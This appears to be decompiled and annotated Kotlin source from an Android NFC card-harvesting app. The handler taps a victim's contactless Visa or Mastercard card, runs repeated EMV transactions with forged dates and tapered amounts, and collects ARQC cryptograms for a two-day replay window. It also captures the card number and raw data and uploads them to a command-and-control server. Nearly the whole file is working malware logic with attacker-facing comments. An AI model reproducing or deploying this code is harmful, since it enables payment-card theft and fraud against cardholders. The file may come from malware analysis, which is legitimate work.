// orig: B2/q.java   (R8-renamed suspend lambda)
//
// THE HEART OF THE HARVESTER.
//
// Launched on Dispatchers.IO from MainActivity.onNewIntent whenever a tag
// is presented. Drives every cached scenario through EmvKernel, harvests
// ARQCs, persists them, and kicks an immediate upload.
//
// Loop shape (per tap):
//   for each surviving CveConfig:
//       for day_offset in 0..2:
//           for inner in 0..(8|8|4):
//               taper amount, build TLV overlay (9A=yyMMdd, 9F02=amount)
//               run a complete EMV transaction via EmvKernel
//               accumulate HarvestedTx(atc, arqc, ...)
//
// Producing today / today+1 / today+2 cryptograms gives the operator a
// 2-day replay window without re-engaging the victim.

package xyz.happify.ckemv.nfc

import android.nfc.tech.IsoDep
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import xyz.happify.ckemv.MainActivity
import xyz.happify.ckemv.db.HarvestDatabaseHelper
import xyz.happify.ckemv.jni.EmvKernel
import xyz.happify.ckemv.model.CardRecord
import xyz.happify.ckemv.model.HarvestedTx
import xyz.happify.ckemv.net.PostTapUploader
import xyz.happify.ckemv.net.C2
import xyz.happify.ckemv.ui.HideProgressBar
import xyz.happify.ckemv.ui.ShowProgressBar
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.LinkedHashMap
import java.util.Locale

class NfcTapHandler(
    private val activity: MainActivity,
    private val isoDep:   IsoDep
) {
    /** PPSE select APDU — the standard contactless directory query. */
    private val PPSE_SELECT = "00A404000E325041592E5359532E444446303100"

    suspend operator fun invoke() {
        activity.progressFlow.value = 0
        withContext(Dispatchers.Main) { ShowProgressBar(activity)() }

        try {
            isoDep.connect()
            isoDep.setTimeout(10_000)

            val db    = activity.dbHelper
            val cves  = db.getAllCves()
            if (cves.isEmpty()) {
                isoDep.tryClose()
                withContext(Dispatchers.Main) { HideProgressBar(activity)() }
                return
            }

            // ---- SELECT PPSE → infer scheme by AID prefix in response hex ----
            val ppseResp = try {
                isoDep.transceive(MainActivity.hexToBytes(PPSE_SELECT))
            } catch (_: Exception) { null }
            val ppseHex = ppseResp?.let { MainActivity.bytesToHex(it) } ?: ""

            val network = when {
                "A000000003" in ppseHex -> "Visa"
                "A000000004" in ppseHex -> "Mastercard"
                else                    -> "Unknown"
            }

            // Keep only scenarios that supply tags for the detected scheme.
            val applicable = cves.filter {
                (network == "Visa"       && it.visa_tags.isNotEmpty()) ||
                (network == "Mastercard" && it.mastercard_tags.isNotEmpty())
            }
            if (applicable.isEmpty()) {
                isoDep.tryClose()
                withContext(Dispatchers.Main) { HideProgressBar(activity)() }
                return
            }

            val harvested = mutableListOf<HarvestedTx>()
            val dateFmt   = SimpleDateFormat("yyMMdd", Locale.CHINA)
            val totalSlots = applicable.size * 20    // 8 + 8 + 4 per scenario
            var slotIdx    = 0
            var capturedPan     = ""
            var capturedAid     = ""
            var capturedRawData = ""

            for (cve in applicable) {
                val baseTags = if (network == "Visa") cve.visa_tags else cve.mastercard_tags

                for (dayOffset in 0..2) {
                    val innerCount = if (dayOffset < 2) 8 else 4   // 8 + 8 + 4

                    var amount = cve.amount.toLong()
                    for (inner in 0 until innerCount) {
                        slotIdx++
                        activity.progressFlow.value = (slotIdx * 100) / totalSlots

                        // taper: 95% then subtract rand(0..100)
                        val tapered = (amount * 95) / 100
                        amount = tapered - (0..100).random().toLong().coerceAtMost(tapered)
                        if (amount < 100) break

                        // build TLV overlay: scenario tags + freshness (9A, 9F02)
                        val overlay = LinkedHashMap(baseTags).apply {
                            val cal = Calendar.getInstance().apply { add(Calendar.DAY_OF_YEAR, dayOffset) }
                            put("9A",   dateFmt.format(cal.time))
                            put("9F02", String.format("%012d", amount))
                        }

                        try {
                            EmvKernel.initialize(true, JSONObject(overlay as Map<*, *>).toString())
                            val start = System.currentTimeMillis()

                            // APDU pump
                            while (EmvKernel.getStatus() == "InProgress") {
                                val apdu = EmvKernel.getNextCommand()
                                if (apdu.isNotEmpty()) {
                                    val rsp = isoDep.transceive(MainActivity.hexToBytes(apdu))
                                    EmvKernel.processResponse(MainActivity.bytesToHex(rsp))
                                }
                            }
                            val elapsed = (System.currentTimeMillis() - start).toDouble()

                            val atc  = EmvKernel.getAtc().ifEmpty { "N/A" }
                            val arqc = EmvKernel.getArqc()
                            if (arqc.isNotEmpty()) {
                                EmvKernel.getPan().takeIf  { it.isNotEmpty() }?.let { capturedPan     = it }
                                EmvKernel.getAid().takeIf  { it.isNotEmpty() }?.let { capturedAid     = it }
                                EmvKernel.getRawData().takeIf { it.isNotEmpty() }?.let { capturedRawData = it }

                                harvested += HarvestedTx(
                                    atc     = atc,
                                    arqc    = arqc,
                                    timeMs  = elapsed,
                                    params  = EmvKernel.getTxParameters(),
                                    cve_id  = cve.id
                                )
                            }
                        } catch (e: Exception) {
                            // "Lost connection to card" — bail this scenario.
                            val msg = e.message ?: "Lost connection to card"
                            break
                        }
                    }
                }
            }

            isoDep.tryClose()

            if (harvested.isNotEmpty()) {
                val net = when {
                    "A000000003" in capturedAid -> "Visa"
                    "A000000004" in capturedAid -> "Mastercard"
                    else                        -> "Unknown"
                }
                val record = CardRecord(
                    pan      = capturedPan.ifEmpty { "Unknown PAN" },
                    aid      = capturedAid,
                    network  = net,
                    rawData  = capturedRawData,
                    txs      = harvested
                )
                val cardId = db.insertCard(record)
                val apiKey = db.getApiKey() ?: "no-key"

                // Best-effort fast path: try to push this card right now.
                // If it fails, UploadLoop will retry every 10 s.
                CoroutineScope(Dispatchers.IO).launch {
                    PostTapUploader(record, apiKey, activity, cardId).invoke()
                }
            }
        } catch (_: Exception) {
            // Swallow everything — operator only notices missed taps as
            // missing rows at the C2.
            isoDep.tryClose()
        } finally {
            withContext(Dispatchers.Main) { HideProgressBar(activity)() }
        }
    }

    private fun IsoDep.tryClose() { try { close() } catch (_: Exception) {} }
}

// ---- canonical upload payload, used by NfcTapHandler / UploadLoop / PostTapUploader ----
internal fun CardRecord.toUploadJson(): JSONObject {
    val root = JSONObject().apply {
        put("pan",      pan)
        put("aid",      aid)
        put("network",  network)
        put("tx_count", txs.size)
        try { put("raw_data", JSONObject(rawData)) }
        catch (_: Exception) { put("raw_data", rawData) }
    }
    val txArr = JSONArray()
    for (tx in txs) {
        val obj = JSONObject().apply {
            put("atc",     tx.atc)
            put("arqc",    tx.arqc)
            put("time_ms", tx.timeMs)
            put("cve_id",  tx.cve_id)
            try { put("params", JSONObject(tx.params)) }
            catch (_: Exception) { put("params", tx.params) }
        }
        txArr.put(obj)
    }
    root.put("harvested_txs", txArr)
    return root
}
